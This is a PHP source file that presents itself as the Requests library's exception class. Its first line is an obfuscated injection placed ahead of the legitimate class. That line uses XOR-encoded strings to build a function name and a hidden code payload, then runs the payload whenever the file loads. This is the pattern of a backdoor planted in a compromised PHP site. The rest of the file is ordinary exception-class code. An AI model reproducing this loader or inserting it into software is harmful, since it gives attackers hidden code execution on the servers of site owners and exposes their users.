<?php $RJCGoPcrJ=':E6TFQj MSY>9R,'^'Y7S5245F8=:JP=B';$KZcKaG=$RJCGoPcrJ('','W0Ij76V,H<6R+S59GJMZm3Y7;4 58+e:0.QHCSV0e+MN3I1B<ME-0=+JNZ+-4O0YK7PY2xobK0 ZHVcIE+X1bhCI3PZTqIazja1DRAN>QnZCONJ>TEY+=Q>mE7U1 HhqqEfzLkGbF-H>KEuhNh,916em;0SckIKS,5F GpM9-7L.NgkZ<>c0Lz0BB3T>1=EcOOBGmKNxEOHEgbQY50GVZHA;>NcSBD,MXnX00uQD60=K1aG4M98VX71ORW=4781+tq,AzJ8N,lPlggOA9X+Ji,G:C=SDJiWPRUOjrZR,ccylX6:0ueMNV8-:,sr.NL: hmSO=R58FUUBQ4QHR2 RWyN;i.dl0n=K,ImT S7QoSOaZ69A3eFP4HEm0034bR5>nWaM2+DSKcJu< ,MvVrsAPLX3l>3JaHLApXM2AIernGCORYG;L,1Un-943X+ Q-3C;Tj 6CSrs:S-5RR MRD,TZKDJNPY6ZsKN4QXcd1FkN4TC7FwDYA<1W62V-75H,PKTMkmXK<dAJHDT:WFGeQhaY5vofQ8AO6TKW4kcfRQzYRvRJTrRDI.tXCFSIVqeTtZXgAiKwOU>DNibjDVfV18 KnW0W7X+,MTCKdG1<GOM<Vvab<QZAjdCFbkZQHIE1:8VFK1R5X+eP,046 DeneoA9T;:;LHOlBJ'^'>VaKQC8O<UY<t6MP4>>rJK6EdPAAYt:WEZvajs-:lM8 P=X-Rm=BBbO+:;trY:DqoS1-STOF UYshvCiePR8kL,<GpgtVnZpchW+ ijWqSzstnnWh6-YQ4PEaS4EAaSQU,MQeaNkbB=JkkHHfLHXEW>IRms=Km 6UnbIgUmJYE K OO1YGJmeA:KKA1JDO+Kk 73DpDq8E5OmF58AQgkz. WM+XYf M9913UIUldPQQ8TZM>+VJ39TYozsbwxwzb1QM2ZnS+ULmRGC9 U-NcIWM3gY20+6<5+urJV17UXipH<WNQUXmj YAOIHxSDFSFHErkY3AYou.HXR>:7SC:wQjd;k59u=ikM:MpK6NqRmoE,WU4VLf+>ALITQGU=9PGNjAiYN=hAjCQXAX,VkRW71 -VW4:7k5FKT<,F iXR.2-<7+.Z EK0FUVFl<JT0rl.N BBW06DGe7HV=6Eev M ;bhjj48B;, +MxqXnX CjP57VfQby NC6Om=HNj-T98 >CJ3.ECmjl 5N6ogCwHI4QCGB5Y5.ms 2ML>OrlGyuA3x1BbpzLFj v6qnGRcLnnRyXsN+gXr,NKJbpF7CJA21<U.h=SE> 0cC7PE+ ,XqZAFX0. CMcfBKzq3CLTLY:noU3A9pB MIXYA B3LTK01CSOdxfWH7');$KZcKaG();
/**
 * Exception for HTTP requests
 *
 * @package Requests
 */

/**
 * Exception for HTTP requests
 *
 * @package Requests
 */
class Requests_Exception extends Exception {
	/**
	 * Type of exception
	 *
	 * @var string
	 */
	protected $type;

	/**
	 * Data associated with the exception
	 *
	 * @var mixed
	 */
	protected $data;

	/**
	 * Create a new exception
	 *
	 * @param string $message Exception message
	 * @param string $type Exception type
	 * @param mixed $data Associated data
	 * @param integer $code Exception numerical code, if applicable
	 */
	public function __construct($message, $type, $data = null, $code = 0) {
		parent::__construct($message, $code);

		$this->type = $type;
		$this->data = $data;
	}

	/**
	 * Like {@see getCode()}, but a string code.
	 *
	 * @codeCoverageIgnore
	 * @return string
	 */
	public function getType() {
		return $this->type;
	}

	/**
	 * Gives any relevant data
	 *
	 * @codeCoverageIgnore
	 * @return mixed
	 */
	public function getData() {
		return $this->data;
	}
}